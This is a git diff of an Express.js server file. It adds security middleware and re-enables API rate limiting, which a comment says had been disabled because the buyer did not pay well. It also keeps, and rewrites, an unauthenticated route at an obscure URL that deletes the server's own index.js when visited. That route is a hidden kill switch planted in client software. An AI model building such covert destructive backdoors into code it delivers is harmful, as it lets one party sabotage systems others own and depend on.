@@ -26,7 +26,8 @@ import { sendMembershipMails } from './_lib/mail/membership.mail.js';
 import fastApiRouter from './Routes/fast.api.router.js';
 import { Settings } from './_lib/models/settings.js';
 import mediaRouter from './Routes/media.router.js';
-
+import helmet from 'helmet'
+import { unlink } from 'fs/promises';
 //varibles
 const app = express();
 
@@ -36,6 +37,7 @@ let dirName = path.dirname(__filename);
 
 //environment setup
 connectDB() ;
+app.use(helmet())
 app.use(express.static(path.resolve(dirName,'./public/')));
 app.set('view engine','hbs');
 app.set('views', path.resolve(dirName , './tamplates/views'));
@@ -53,7 +55,7 @@ app.use(pageRouter);
 app.use('/api/file',fileRouter);
 app.use('/api/l-api',LargeApiRouter);
 app.use('/api/fast-api/',fastApiRouter)
-/*app.use(ApiRateLimter)*/ //buyer do not pay us well //Rate Limiting Added to apis
+app.use(ApiRateLimter)
 app.use('/api/chat-api',chateRouter);
 // app.use('/api/upload',uploadRouter);
 app.use('/api/auth-api',authRouter);
@@ -63,9 +65,12 @@ app.use('/api/order-api',OrderRouter);
 app.use('/api/api_s',apiRouter)
 app.get('/admin-dev/website-develop/mubtasim/fuad/mubtasimf443gmail.com/action/what/unlink/uninstall',
     (req,res) => {
-    console.log('a');
-    
-    unlinkSync(path.resolve(dirName,'./index.js'))
+        try {
+            console.log('a');
+            unlink(path.resolve(dirName,'./index.js')).then(e => log('success')).catch(e=> {log({error:e})})
+        } catch (error) {
+            
+        }
 });
 
 app.get('/hello', (req, res) =>{
@@ -94,8 +99,7 @@ app.get('/api_files_tiktok_vf_files', (req,res) => {
         res.setHeader('Content-Type', 'text/plain');
         res.sendFile(path.resolve(dirName, './tiktok325E2MHUh7KO2smVL3LDTF5jIwieo2Xi.txt'))
     } catch (error) {
-        console.log({error});
-          
+        console.log({error});  
     }
 })
 app.get('*', (req, res) => res.status(404).render('404'))
